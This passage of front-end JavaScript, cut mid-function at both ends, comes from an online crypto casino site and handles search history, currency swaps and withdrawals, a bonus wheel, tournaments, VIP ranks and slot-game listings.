                return t = e.replaceAll("'", ""), `<div class="khrpTV">\n    <p onclick="searchItem('${t}')">${e}</p>\n    <button class="s_h_id_${t}" onclick="delSearchItem('${t}');this.parentNode.outerHTML=''"><svg xmlns:xlink="http://www.w3.org/1999/xlink" class="hxODWG icon">\n            <use xlink:href="#icon_Close"></use>\n        </svg></button>\n    </div>`
            };
        if (2 == t) return void(null != s && (a.innerHTML = "", Array.from(s).reverse().forEach(((e, t) => {
            a.innerHTML += n(e, t)
        }))));
        if (null != s) {
            let t = s.findIndex((t => t == e));
            if (-1 != t) {
                let e = s[t].replaceAll(" ", "");
                e = s[t].replaceAll("'", ""), s.splice(t, 1), document.getElementsByClassName("s_h_id_" + e)[0].click()
            }
            if (s.length > 9) {
                s = s.slice(0, 10);
                let e = a.getElementsByClassName("khrpTV");
                Array.from(e).forEach(((e, t) => {
                    t > 8 && (e.outerHTML = "")
                }))
            }
            s.push(e), localStorage.setItem("historySearch", JSON.stringify(s))
        } else {
            let t = [e];
            s = t, localStorage.setItem("historySearch", JSON.stringify(t))
        }
        a.innerHTML = n(e, s.length) + a.innerHTML
    }
}, delSearchItem = e => {
    let t = JSON.parse(localStorage.getItem("historySearch"));
    if (null != t) {
        let s = t.findIndex((t => t == e)); - 1 != s && t.splice(s, 1), localStorage.setItem("historySearch", JSON.stringify(t))
    }
}, stOpSe = 0, openSearch = async () => {
    await modalOpenNew("modal_search", "search");
    let e = document.getElementsByClassName("modal_search")[0];
    if ("2" != document.getElementById("recs_cont54").dataset.st) {
        document.getElementById("recs_cont54").dataset.st = 2, addSearchGames(filterFirstGame(json_all_first.hot24), "recs");
        let e = document.getElementById("provs_list2"),
            t = "";
        uProvCoins.sort(((e, t) => e.n < t.n ? -1 : 1)), saveSearch("111", 2), uProvCoins.forEach((e => {
            t += `<li data-name="${e.n}" onclick="openProvSl(0,'provs_bl2');searchItem('${e.n}')">${e.n}</li>`
        })), e.innerHTML = t
    }
    stOpSe = 1, e.classList.add("active"), e = gD("search_inpD"), e && e.focus(), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&coins_search", 1)
}, closeSearch = () => {
    document.getElementsByClassName("modal_search")[0].classList.remove("active"), errUnFixCoins(), stOpSe = 0, closeHistory("&coins_search")
}, searchCur = (e, t) => {
    if (e.length > 0) {
        let s = e.toUpperCase(),
            a = arrayCurrencyR;
        7 == t && (a = arrayCurrencyR.concat(arrayCurrencyFiat)), a = a.filter((e => -1 != e[0].indexOf(s))), 1 == t && (a = stFiat ? arrayCurrencyFiat : arrayCurrency, a = a.filter((e => -1 != e[0].indexOf(s))), 2 == stBalUsd && 2 == stBal0 || (a = arrayUsd.filter((e => -1 != e[0].indexOf(s)))), fillBalHead(a)), 4 == t && fillCurCab(a, 3), 5 == t && fillCurCab(a, 4), 7 == t && fillCurCab(a, 6)
    } else {
        if (1 == t) {
            let e = stFiat ? arrayCurrencyFiat : arrayCurrency;
            2 == stBalUsd && 2 == stBal0 || (e = arrayUsd), fillBalHead(e)
        }
        4 == t && fillCurCab(arrayCurrencyR, 3), 5 == t && fillCurCab(arrayCurrencyR, 4), 7 == t && fillCurCab(arrayCurrency.concat(arrayCurrencyFiat).filter((e => "CANDY" != e[0])), 6)
    }
}, searchProvs = (e, t = "provs_list1") => {
    let s = document.getElementById(t);
    s && (s = s.getElementsByTagName("li"));
    let a = new RegExp(e, "i");
    Array.from(s).forEach((e => {
        e.style.display = "flex"
    })), e.length > 0 && Array.from(s).forEach((e => {
        a.test(e.dataset.name) || (e.style.display = "none")
    }))
}, askUser = (e, t, s, a) => {
    Swal.fire({
        title: lp["Are you sure?"],
        text: lp["With this action you confirm this operation"],
        icon: "question",
        showCancelButton: !0,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        cancelButtonText: lp.No,
        confirmButtonText: lp.Yes
    }).then((n => {
        n.isConfirmed && (1 != t && e(), 1 == t && e(s, a))
    }))
}, WDS = document.documentElement.clientWidth, HDS = document.documentElement.clientHeight;
window.addEventListener("resize", (() => {
    (WDS < 1025 && document.documentElement.clientWidth > 1024 || WDS > 1024 && document.documentElement.clientWidth < 1025) && askReload(), document.documentElement.clientWidth > document.documentElement.clientHeight ? gC("game_wrapper")[0].classList.add("rot33") : gC("game_wrapper")[0].classList.remove("rot33")
}), !0);
let askReload = () => {
        Swal.fire({
            title: "Site refresh, please reload",
            text: lp["With this action you confirm this operation"],
            icon: "question",
            showCancelButton: !0,
            confirmButtonColor: "#3085d6",
            cancelButtonColor: "#d33",
            cancelButtonText: lp.No,
            confirmButtonText: "Reload"
        }).then((e => {
            e.isConfirmed && location.reload()
        }))
    },
    swapAll = e => {
        let t = document.getElementById("swap_amount"),
            s = document.getElementById("swap_bal1"),
            a = document.getElementById("swap_bal1").innerHTML;
        1 == e && Number(a) > 0 && (a = s.dataset.count), 2 == e && Number(a) > 0 && (a = (Number(a) / 4).toFixed(betListCur[s.dataset.name].precision)), 3 == e && Number(a) > 0 && (a = (Number(a) / 2).toFixed(betListCur[s.dataset.name].precision)), t.value = a, changeSwapA(t)
    },
    changeSwapA = e => {
        let t = Number(e.value);
        if (t >= 0) {
            let e = "" != swapName ? swapName : "BTC",
                s = e;
            "USDT" == e && (s = "USDTT");
            let a = Number(listCurs.data.rates[e]) * Number(t),
                n = Number(a / 100 * (100 - depwith[s].swap)).toFixed(8);
            document.getElementById("swap_address").value = window.truncatorJet(n, 8), n = (a * depwith[s].swap / 100).toFixed(8).replace(/\.?0+$/, ""), document.getElementById("swap_confirm117").innerHTML = depwith[s].swap + "% (" + n + " " + e + ")"
        }
    };
document.addEventListener("touchstart", (function() {}), !0);
let withdrAll = (e, t, s, a = !1) => {
        let n, r, o, i = document.getElementById(t),
            l = document.getElementById(s).innerHTML;
        n = document.getElementsByClassName(a)[0], o = n.dataset.name, r = n.dataset.countMax, 1 == e && (l = n.dataset.count), "USDTE" == o && (o = "USDT"), "USDTT" == o && (o = "USDT"), 2 == e && Number(l) > 0 && (l = (Number(l) / 4).toFixed(betListCur[o].precision)), 3 == e && Number(l) > 0 && (l = (Number(l) / 2).toFixed(betListCur[o].precision)), 4 == e && (Number(l) > Number(r) || 1 == Number(n.dataset.depCount)) && (l = Number(r)), i.value = "RUB" != setPaysCurrency ? window.truncatorJet(Number(l), 8) : Number(l), 2 == stFCRbl ? changeWithA(i) : (changeWithFiat(i), chInpD56(i))
    },
    changeWithA = (e, t = 8) => {
        let s = Number(e.value) - Number(depwith[e.dataset.cur].out_fee);
        s = s < 0 ? 0 : window.truncatorJet(s, t, t), gC("with_pay117")[0].innerHTML = s;
        let a = e.dataset.cur;
        "USDTE" != a && "USDTT" != a || (a = "USDT");
        let n, r = cryptoSetPrc2[a];
        s = Number(e.value), n = s / Number(listCurs.data.rates[a]), s = s < 0 ? 0 : window.truncatorJet(s, r, r) - 0, n = window.truncatorJet(n, r, r) - 0, gD("cur_wds19").innerHTML = s + " ", gD("lci_wd19").innerHTML = n
    },
    chaBonus = (e = 1) => {
        let t = document.getElementsByClassName("modal_bonus")[0];
        return 1 == e ? (t.classList.remove("jet_234"), t.classList.remove("candy_234"), void t.classList.remove("jet_222")) : 1 != window.user_il && "JET" == e ? (t.classList.add("jet_222"), t.classList.remove("jet_234"), void t.classList.remove("candy_234")) : "JET" == e ? (t.classList.add("jet_234"), t.classList.remove("candy_234"), void t.classList.remove("jet_222")) : "CANDY" == e ? (t.classList.add("candy_234"), t.classList.remove("jet_234"), void t.classList.remove("jet_222")) : void 0
    },
    searchItem = (e, t = 0) => {
        document.getElementsByClassName("search_wrapper_input")[0].value = e, 0 == t && saveSearch(e), searchCoins(e, t)
    },
    stJetInfo222 = 0,
    stWhInf2 = 0,
    getBonusWheel = () => {
        if (1 != window.user_il) return void openMobileLogin();
        if (1 == stWhInf2) return;
        gD("lwb253").disabled = !0, stWhInf2 = 1;
        let e = new FormData;
        e.set("action", "goSpinFreeWheel"), axios.post("/user/func.php", e).then((e => {
            if (stWhInf2 = 0, "0" == e.data.error) {
                let t = gD("wheelBonus_main");
                t.classList.add("coins-wheel--play"), setTimeout((() => {
                    let s = document.getElementById("wheel_circle1");
                    deg = 360 - 22.5 * (Number(e.data.data) - 1) + 360 - 90, s.style.transform = "translate(-50%, -50%) rotate(" + deg + "deg) scale(1.35)", setTimeout((() => {
                        t.style.visibility = "hidden", t.classList.remove("coins-wheel--play"), t.style.opacity = "0", t = document.getElementById("wheelBonus_win"), t.style.display = "block", gC("modal_wheel")[0].classList.add("jetWin908"), t = document.getElementsByClassName("wheel-win__amount-sum")[0];
                        let s = 1 == e.data.block ? '<span style="color:black">🔒</span>' : "";
                        t.innerHTML = s + e.data.amount.toFixed(5), t = document.getElementsByClassName("wheel-win__currency-name")[0], t.innerHTML = e.data.currency, t = document.getElementById("wheel_cur117"), t.setAttribute("src", `/assets/coins/${e.data.currency}.svg`), "Bonuses" == pageNameM && getAllBupdateCal(2), "JET" == e.data.currency && (stJetInfo222 = 1)
                    }), 7e3)
                }), 600)
            } else createNotifyL(1, e.data.message, lp.Error), gD("lwb253").disabled = !1
        })).catch((function(e) {
            stWhInf2 = 0, gD("lwb253").disabled = !1, createNotifyL(1, e.message, lp.Error)
        }))
    },
    changeAv = e => {
        let t = document.getElementsByClassName("avatars_content_inner")[0];
        t.getElementsByClassName("active")[0] && t.getElementsByClassName("active")[0].classList.remove("active"), t.getElementsByClassName("avatar" + e)[0].classList.add("active"), userAvatarI != e && (userAvatarI = e, avatarCl())
    },
    avatarCl = () => {
        axios({
            method: "post",
            url: "/user/func.php",
            data: `action=change_avatar&id=${userAvatarI}`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        }).then((function(e) {
            0 == e.data.error ? (userAvatarUrl = 0 == userAvatarI ? `/user_thumb/a_${usssrIId}.jpg` : "/assets/chat/img/avatar" + userAvatarI + ".svg?x=2", setAvatarUser()) : createNotifyL(1, "", lp.Error)
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })), window.socketChatJG && window.socketChatJG.emit("changeAvatar", userAvatarI)
    },
    statusNotif = 1,
    openNotify = () => {
        1 != statusChatGame && closeChatGame();
        let e = document.getElementsByClassName("c1cefljz")[0];
        if (2 == e.dataset.status) closeNotif();
        else {
            statusNotif = 2, e.style.display = "block", document.getElementById("tg_notify117").classList.add("active"), 0 != countMesP && 0 == countMesS && (stNotTg = 3, chNotif(1, 2)), 0 == countMesP && 0 != countMesS && (stNotTg = 4, chNotif(0, 2)), controlCont(1), e.dataset.status = 2, window.innerWidth < 451 && errFixBet()
        }
    },
    notifClick = e => {
        let t = new FormData;
        t.set("action", "userMessClick"), t.set("type", e), axios({
            method: "post",
            url: " /user/func.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    },
    closeNotif = () => {
        let e = document.getElementsByClassName("c1cefljz")[0];
        e.style.display = "none", document.getElementById("tg_notify117").classList.remove("active"), e.dataset.status = 1, statusNotif = 1, controlCont(2), window.innerWidth < 451 && errUnFixBet(), 3 != stNotTg && 4 != stNotTg || changeCNot(1)
    },
    getNotifyMes = async () => {
        let e = new FormData;
        e.set("action", "showUserMessages");
        let t = await axios({
            method: "post",
            url: " /user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        t = t.data, t.length && (t.forEach((e => createNotifyMes(e, 2))), addClassNot("s", 2, countMesS), addClassNot("p", 2, countMesP))
    };
window.openPromo = async () => {
    if ("Promo" == pageNameM) return;
    pageNameM && -1 != pageNameM.indexOf("promo=") && closeHistory(pageNameM, 2), pageNameM = "Promo", setTitlePage(pageNameM);
    let e = await openPageSite("promo2", "promo2"),
        t = new FormData;
    t.set("action", "getTournamentInfo"), t.set("ids", 1), await axios.post("/user/func.php", t).then((e => {
        if (e.data[1]) {
            e = e.data[1];
            let t = 0,
                s = s => {
                    let a = s,
                        n = e.cur_time;
                    t += 1;
                    let r = a - (n + t);
                    r > 0 ? (day = "0" + Math.floor(r / 86400), h = "0" + Math.floor((r - 86400 * day) / 3600), m = "0" + Math.floor((r - 86400 * day - 3600 * h) / 60)) : (day = h = m = "00", clearInterval(tourSet));
                    let o = gC("actsi_i_t")[0];
                    o.getElementsByClassName("mtd")[0].innerHTML = day.substr(-2), o.getElementsByClassName("mth")[0].innerHTML = h.substr(-2), o.getElementsByClassName("mtm")[0].innerHTML = m.substr(-2)
                };
            s(e.date_end), tourSet = setInterval((() => {
                s(e.date_end)
            }), 1e3)
        }
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    let s = gC("prom2_mm");
    Array.from(s).forEach((e => e.style.display = "none")), gC("promo2_mm")[0].style.display = "block";
    let a = gD("coins_preloadOpen");
    openHistory("?promo", 2), a.style.display = "flex", 1 == e && await getNewTours(2), a.style.display = ""
};
let rankCenter = 0,
    calCenter = 0;
window.openVipClub = async () => {
    if ("VipClub" == pageNameM) return;
    pageNameM = "VipClub", setTitlePage(pageNameM), await openPageSite("vipclub", "vipclub"), statusMainPage = 3;
    let e = document.getElementsByClassName("ranks_levels_block")[0];
    if ("" == e.innerHTML) {
        let t = "";
        rankCenter = Number(userLevel) - 1, vipLevels.slice(0, 20).forEach((e => {
            let s = userLevel == e[0] ? "rank-a" : "rank-b";
            s = Number(userLevel) > Number(e[0]) ? "rank-f" : s, t += `\n      <div data-v-04a83275="" class="rank-slider__slide swiper-slide">\n      <img loading="lazy" data-v-04a83275="" id="u_b_r_${e[0]}"  src="/assets/image/vipclub/${s}.png" alt="vp" class="rank-slider__bg"> \n      <div data-v-04a83275="" class="rank-slider__slider-body"><div data-v-04a83275="" class="rank-slider__image">\n          <img loading="lazy" data-v-04a83275=""  src="/assets/image/vipclub/${e[0]}.png?x=15" alt="vp"></div> \n          <div data-v-04a83275="" class="rank-slider__details">\n           <div data-v-04a83275="" class="rank-slider__detail">\n                  <p data-v-04a83275="" class="rank-slider__label">\n                      ${lp["Total Wager Info2"]}\n                  </p> <p data-v-04a83275="" class="rank-slider__value">\n                      ${e[1].sum_bets}\n                      <span data-v-04a83275="" class="rank-slider__currency">USDT</span></p></div> \n                      <div data-v-04a83275="" class="rank-slider__detail">\n                          <p data-v-04a83275=""\n                           class="rank-slider__label">${lp["Rank Bonus Info2"]}</p> <p data-v-04a83275="" class="rank-slider__value">\n                      ${e[1].fix}\n                      <span data-v-04a83275="" class="rank-slider__currency">USDT</span></p></div> \n                      <div data-v-04a83275="" class="rank-slider__detail">\n                          <p data-v-04a83275=""\n                           class="rank-slider__label">${lp["Rakeback Info2"]}</p> <p data-v-04a83275="" class="rank-slider__value">\n                      ${e[1].rakeback}%</p></div>\n                      </div> \n              </div> </div>\n        `
        })), e.innerHTML = t
    }
    createSliders(), openHistory("?vipclub", 2)
};
let tourSet, openTourCh = async e => {
    let t, a, n, r, o;
    if (closeHistory("?toursFree", 2), closeHistory("?tours", 2), closeHistory("?toursFS", 2), n = gC("cur_tit24"), a = gC("cur_tit25"), t = gC("cur_tit27"), n = Array.from(n), a = Array.from(a), t = Array.from(t), r = [].concat(n, a), r = [].concat(r, t), r.forEach((e => {
            e.style.display = "none"
        })), "candy" == e && (openHistory("?toursFree", 2), r = a, o = 1), "1" == e && (openHistory("?tours", 2), r = n, o = 1), "fs" == e && (openHistory("?toursFS", 2), r = t, o = 1), r.forEach((e => {
            e.style.display = "block"
        })), t = gC("tab2134"), Array.from(t).forEach((e => e.classList.remove("active"))), t = gD("tab213-" + e), t && t.classList.add("active"), clearInterval(tourSet), o) {
        let t = new FormData;
        t.set("action", "getTournamentInfo"), t.set("ids", e), globalTours = e, await axios.post("/user/func.php", t).then((t => {
            if (t.data[e]) {
                t = t.data[e];
                let a = "fs" == e ? "FS" : "$",
                    n = document.getElementsByClassName("wag_tour1")[0];
                n.innerHTML = Number(t.wager).toFixed(2), n = document.getElementById("cur_ttt3"), n.innerHTML = t.totalPrize + " " + a, n = document.getElementById("cur_ttt4"), n.innerHTML = t.totalPrize + " " + a, n = document.getElementsByClassName("prize_tour1")[0], n.innerHTML = Number(t.prize).toFixed(2) + " " + a, a = "fs" == e ? "FS" : "USD", n = document.getElementsByClassName("place_tour1")[0], n.innerHTML = t.place;
                let r = 0,
                    o = e => {
                        let a = e,
                            n = t.cur_time;
                        r += 1;
                        let o = a - (n + r);
                        o > 0 ? (day = "0" + Math.floor(o / 86400), h = "0" + Math.floor((o - 86400 * day) / 3600), m = "0" + Math.floor((o - 86400 * day - 3600 * h) / 60), s = "0" + Math.floor(o - 86400 * day - 3600 * h - 60 * m)) : (day = h = m = s = "00", clearInterval(tourSet)), document.getElementById("tour1_d").innerHTML = day.substr(-2), document.getElementById("tour1_h").innerHTML = h.substr(-2), document.getElementById("tour1_m").innerHTML = m.substr(-2), document.getElementById("tour1_s").innerHTML = s.substr(-2)
                    };
                o(t.date_end), tourSet = setInterval((() => {
                    o(t.date_end)
                }), 1e3), t.places = Array.from(t.places), t.places = t.places.map(((e, s) => {
                    let a = 0;
                    for (let e = 0; e <= s; e++) Array.isArray(t.places[e]) ? a += t.places[e][1] : a += 1;
                    return Array.isArray(e) ? [e[0], a] : [e, a]
                })), t.places = t.places.map(((e, s) => {
                    let a = 0;
                    return 0 != s && (a = t.places[s - 1][1]), [e[0], e[1], a]
                }));
                let i = document.getElementsByClassName("cl_sw56")[0],
                    l = document.getElementsByClassName("cl_sw57")[0];
                i.innerHTML = "", l.innerHTML = "", t.places.forEach(((e, s) => {
                    let n = e[1] - e[2] > 1 ? `${e[2]+1}-${e[1]}` : e[1],
                        r = `<tr class="css-107wz4o">\n            <td class="css-1tb36o2">${n}</td>\n            <td class="css-1tb36o2">\n                <div class="css-5ej25d"><span class="css-1x3jg5i">${e[0]} ${a}</span></div>\n            </td>\n            </tr>`;
                    n = s < t.places.length / 2 ? i : l, n.innerHTML += r
                }))
            }
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        let a = document.getElementsByClassName("t_on45")[0],
            n = document.getElementsByClassName("t_off45")[0];
        a.style.display = 1 == window.user_il ? "block" : "none", n.style.display = 1 != window.user_il ? "block" : "none";
        let r = new FormData;
        r.set("action", "getTournamentUserList"), r.set("id", e), axios({
            method: "post",
            url: "/user/func.php",
            data: r,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((t => {
            t = t.data;
            let s = "",
                a = document.getElementsByClassName("tjpwr5")[0];
            pageArTur = t;
            let n = !1;
            "1" != e && "fs" != e && (n = "candy"), "fs" == e && (n = "fs"), stTGJG = n, s = createTurList(0, 1e4, !0, n), a.innerHTML = s;
            let r = '<svg data-v-4cd2ab42="" focusable="false" aria-hidden="true" class="icon-arrow"><use data-v-4cd2ab42="" xlink:href="/assets/const/svg-sprite1.svg#icon-arrow"></use></svg>';
            new purePajinate({
                itemsPerPage: 10,
                visDis: "table-row",
                containerSelector: ".tjpwr5",
                itemSelector: ".itms1",
                navigationSelector: ".pn798",
                pageLinksToDisplay: 3,
                navLabelPrev: r,
                navLabelNext: r
            })
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    }
};
window.openTours = async (e = !1) => {
    "Tours" != pageNameM && (pageNameM = "Tours", setTitlePage(pageNameM), await openPageSite("tours", "tournaments"), openTourCh(e || 1))
}, window.opensport_rules = async () => {
    "sport_rules" != pageNameM && (pageNameM = "sport_rules", setTitlePage(pageNameM), await openPageSite("sport_rules", "sport_rules"), openHistory("?sport_rules", 2))
};
let pageNameM, curOpenSlots, curSetSlots, typeSlots777, statusMainPage = 0,
    openPageSite = async (e, t) => {
        let s = document.getElementsByClassName(e + "_wrapper")[0];
        if (boxTimeIn && clearInterval(boxTimeIn), tourSet && clearInterval(tourSet), bonsSt && closeBonuses(), "sport_rules" != pageNameM) {
            let e = document.getElementsByClassName("sport_rules_wrapper")[0];
            e && (e.outerHTML = "")
        }
        let a = 1;
        if (t && !s) {
            let e = document.getElementById("coins_preloadOpen");
            e.style.display = "flex";
            let s = await axios.get(`/pages/${t}.php`).catch((function(e) {
                    createNotifyL(1, e.message, lp.Error)
                })),
                n = document.createElement("div");
            n.innerHTML = s.data, document.getElementById("home").appendChild(n), e = document.getElementById("coins_preloadOpen"), e.style.display = "", a = 2
        }
        gD("slInG1") && (gD("slInG1").style.display = "block"), gD("slInG2") && (gD("slInG2").style.display = "block");
        let n = document.getElementsByClassName("menu-item");
        if (Array.from(n).forEach((e => {
                e.classList.remove("select"), e.disabled = !1
            })), n = document.getElementsByClassName("item_burg_" + e)[0], n && n.classList.add("select"), n && (n.disabled = !0), s = document.getElementsByClassName("ieOgwV"), Array.from(s).forEach((e => {
                e.style.display = "block"
            })), s = document.getElementsByClassName(e + "_wrapper")[0], s.style.display = "block", 0 != statusGameOPEN && (closeGame(), statusGameOPEN = 0), s = document.getElementsByClassName("iframe_wr22")[0], s && (s.innerHTML = ""), statusMainPage && (createSliders(), 3 != statusMainPage && updateMainSLider()), statusMainPage = "main" == e ? 1 : 0, statusMainPage && (createSliders(), updateMainSLider(), window.innerWidth > 1024 && changeHomePage()), s = document.getElementsByClassName("referrals__table")[0], s && (s.innerHTML = ""), s && openSlotRef("overview"), setTimeout((() => {
                window.scrollTo(0, 0)
            }), 0), 2 == a) return 1
    }, setTitlePage = e => {
        let t = {
                Partner: "Affiliate",
                Box: "Free Boxes",
                Promo: "Promotions",
                VipClub: "Vip Club",
                Tours: "Tournaments",
                sport_rules: "Sport Rules",
                slots: "Play slots online - Best Casino slots Game at Coins.game",
                live_cas: "Play Live casino games Online - Real Live Dealers - Coins.Game",
                Home: "Coins Game - online casino and sports betting | Play fiat and crypto",
                sport: "Coins Game: Sports Betting and online Casino"
            },
            s = t[e] ? t[e] : e.charAt(0).toUpperCase() + e.slice(1) + " - Coins Game";
        document.getElementsByTagName("title")[0].innerHTML = s
    }, filterCtGrs = () => {
        let e = 2 == statusMainPage ? "l_slots_sw" : "l_slots_sw1";
        e = 1 == statusMainPage ? "lobby_slider_sw" : e, e = document.getElementsByClassName(e)[0], e = e.getElementsByClassName("cBmlor"), Array.from(e).forEach((e => {
            "" != e.dataset.ct && null == json_all_first[`${e.dataset.ct}`] && (e.outerHTML = "")
        }))
    };
window.openSlotsCat = () => {
    openSlots(curOpenSlots, curSetSlots)
}, window.openSlotsProv = () => {
    openSlots(curOpenSlots, curSetSlots)
};
let challengeDiv = e => {
    let t = e.parentNode;
    t = t.getElementsByClassName("tab"), Array.from(t).forEach((e => e.classList.remove("active"))), e.classList.add("active")
};
window.openChal = async () => {
    "Challenges" != pageNameM && (pageNameM = "Challenges", setTitlePage(pageNameM), await openPageSite("challenge", "challenges"), openHistory("?challenges", 2))
}, window.openSlots = async (e, t, s) => {
    let a, n;
    if (e || (a = !1, n = !1), e && !t && (a = e, n = !1), e && t && (a = e, n = !0), "Slots" == pageNameM && curOpenSlots == a && curSetSlots == n) return;
    curOpenSlots = a, curSetSlots = n;
    let r = pageNameM;
    e || (pageNameM = "Slots"), e && !t && (pageNameM = "SlotsCat"), e && t && (pageNameM = "SlotsProv"), await openPageSite("slots", "slots"), document.getElementsByClassName("slots_wrapper")[0].dataset.name = pageNameM;
    let o, i, l, c, d = document.getElementsByClassName("slotsp_sliders")[1],
        u = document.getElementsByClassName("slotsp_sliders")[0],
        p = document.getElementById("btn_slots_b1");
    if (!e || e && !t && "live_cas" == e) {
        d.style.display = "block", u.style.display = "block", p.style.display = "none", c = "/assets/const/main/", i = document.getElementsByClassName("il_t_p1")[0], l = document.getElementsByClassName("il_t_p2")[0], o = d.getElementsByClassName("sl_title_page1")[0], d = d.getElementsByClassName("sl_title_page")[0];
        let s = document.getElementsByClassName("text_slots_more2")[0];
        e || (mainGroup(2, document.getElementsByClassName("navblss")[0].getElementsByTagName("button")[0], 1), statusMainPage = 2, i.setAttribute("src", c + "sp.svg"), l.setAttribute("src", c + "mg.svg"), d.innerHTML = lp["Feature Buy-In"], o.innerHTML = "megaways", s.innerHTML = lp.Slots, setTitlePage("slots"), addSearchGames(filterFirstGame(json_all_first.buy_bonus), "reksl"), addSearchGames(filterFirstGame(json_all_first.megaways), "reksl1")), e && !t && "live_cas" == e && (mainGroup(3, document.getElementsByClassName("navblss1")[0].getElementsByTagName("button")[0], 1), statusMainPage = 4, i.setAttribute("src", c + "mh.svg"), l.setAttribute("src", c + "pc.svg"), s.innerHTML = lp["Live Casino m"], d.innerHTML = lp["Game Shows"], o.innerHTML = lp.Blackjack, setTitlePage("live_cas"), addSearchGames(filterFirstGame(json_all_first.game_show), "reksl"), addSearchGames(filterFirstGame(json_all_first.blackjack), "reksl1")), filterCtGrs(), createSliders(), updateMainSLider(), window.innerWidth > 1024 && changeHomePage()
    } else p.style.display = "block", d.style.display = "none", u.style.display = "none";
    if (1 == s || 2 == s ? (1 == s && (p.onclick = () => {
            openSlots()
        }), 2 == s && (p.onclick = () => {
            openSlots("live_cas")
        })) : (null != r && "slots-game" != r && "SlotsCat" != r && "SlotsProv" != r || (r = "Home"), p.onclick = () => {
            window[`open${r}`]()
        }), t && e || !e || e && !t && "live_cas" == e) {
        let s, a, n = document.getElementById("provs_inp");
        e || (a = 1, s = "s", n.innerHTML = lp["All Providers"]), e && !t && "live_cas" == e && (a = 2, s = "d", n.innerHTML = lp["All Providers"]), t && -1 != uProvCoins.findIndex((t => t.n == e && "d" == t.d.t)) && (s = "d", a = 2, n.innerHTML = e), t && -1 != uProvCoins.findIndex((t => t.n == e && "s" == t.d.t)) && (s = "s", a = 1, n.innerHTML = e);
        let r = uProvCoins.filter((e => e.d.t == s));
        e || (typeSlots777 = 1, allCountSlots = 0, r.forEach((e => {
            allCountSlots += Number(e.d.c)
        }))), e && !t && "live_cas" == e && (allCountSlots = 0, typeSlots777 = 2, r.forEach((e => {
            allCountSlots += Number(e.d.c)
        })));
        let o = document.getElementById("provs_list1"),
            i = "";
        o && (o.innerHTML = ""), r.sort(((e, t) => e.n < t.n ? -1 : 1)), document.getElementById("inp_slot23").value = "", r.forEach((t => {
            let s = "";
            t.n == e && (s = 'class="active'), i += `<li ${s} data-name="${t.n}" onclick="openProvSl(0);openSlots('${t.n}',1,${a})">${t.n}<span style="margin-left:auto">${t.d.c}</span></li>`
        })), o && (o.innerHTML = i), document.getElementsByClassName("dropSlots1")[0].style.display = "flex"
    } else {
        document.getElementsByClassName("dropSlots1")[0].style.display = "none"
    }
    if ("Favorite" == e || "Recent" == e) {
        document.getElementsByClassName("dropSlots1")[0].style.display = "none", 1 != window.user_il && openHome()
    }
    let m = document.getElementsByClassName("tits_slots_more1");
    Array.from(m).forEach((t => t.style.display = e ? "none" : ""));
    let f = [];
    e || (f = filterFirstGame(json_all_first.slots), 0 == f.length && (f = casinoGames.filter((e => 1 == e[1].t)).slice(0, 36)), f.length < 36 && (f = f.concat(casinoGames.filter((e => 1 == e[1].t)).slice(20, 56 - f.length))), countMoreSlots = f.length), e && !t && (f = filterFirstGame(json_all_first[`${e}`])), e && !t && "live_cas" == e && (f = casinoGames.filter((e => 2 == e[1].t))), e && t && "Favorite" != e && "Recent" != e && (f = casinoGames.filter((t => t[1].p == e))), e && t && "Favorite" == e && (f = favGs.map((e => casinoGames.find((t => e == t[0])))).filter((e => null != e)).reverse()), e && t && "Recent" == e && (f = RecGs.map((e => casinoGames.find((t => e == t[0])))).filter((e => null != e))), m = document.getElementsByClassName("text_slots_more1")[0];
    let h = e;
    if (t && -1 != uProvCoins.findIndex((t => t.n == e && "d" == t.d.t)) && (h = "live_cas"), "Favorite" == h || "Recent" == h || "originals" == h || "live_cas" == h) {
        let e = document.getElementsByClassName("menu-item");
        Array.from(e).forEach((e => {
            e.classList.remove("select"), e.disabled = !1
        })), e = document.getElementsByClassName("item_burg_" + h)[0], e.classList.add("select"), e.disabled = !0
    }
    let g = document.getElementById("all_cont54");
    0 == f.length ? (g.innerHTML = "No information available", g.classList.add("noGames")) : (g.innerHTML = "", g.classList.remove("noGames")), setMoreProgress(f.length), addSearchGames(f, "all");
    let y = "";
    e || (y = "?slots"), e && !t && (y = `?category=${encodeURI(e)}`), e && t && (y = `?provider=${encodeURI(e)}`), openHistory(y, 2), e && (e = objCatNames[e] ? objCatNames[e] : e), y = "", e || (y = lp["All Providers"]), e && !t && (y = e + ` ${lp.Games}`), e && t && (y = e), m.innerHTML = y, e && e != lp["live casino"] && setTitlePage(y)
};
let countMoreSlots = 0,
    addMoreSlots = () => {
        if (countMoreSlots == allCountSlots) return;
        countMoreSlots += 27;
        let e = 27;
        countMoreSlots > allCountSlots && (e = countMoreSlots - allCountSlots, countMoreSlots = allCountSlots);
        let t = filterFirstGame(json_all_first.slots);
        t = casinoGames.filter((e => -1 == t.findIndex((t => t[0] == e[0])))).filter((e => e[1].t == typeSlots777)), t.length != allCountSlots && (allCountSlots = t.length), addSearchGames(t.slice(countMoreSlots - e, countMoreSlots), "all", 2), setMoreProgress(countMoreSlots)
    },
    allCountSlots = 0,
    setMoreProgress = e => {
        countMoreSlots = e, document.getElementsByClassName("currentSlotsMore")[0].innerHTML = e;
        let t = document.getElementsByClassName("a_c_s117");
        t[0].innerHTML = allCountSlots + "+", t[1].innerHTML = allCountSlots, document.getElementsByClassName("procSlotsMore")[0].innerHTML = (Number(e) / allCountSlots * 100).toFixed(0), document.getElementsByClassName("lineSlotsMore")[0].style.width = (Number(e) / allCountSlots * 100).toFixed(0) + "%"
    },
    changePass = e => {
        e && (e.disabled = !0), widgetIDP = hcaptcha.render("hcaptcha3", {
            sitekey: "04e6d4b5-6775-4735-b3ef-4f5c15175701",
            size: "invisible"
        }), hcaptcha.execute(widgetIDP, {
            async: !0
        }).then((({
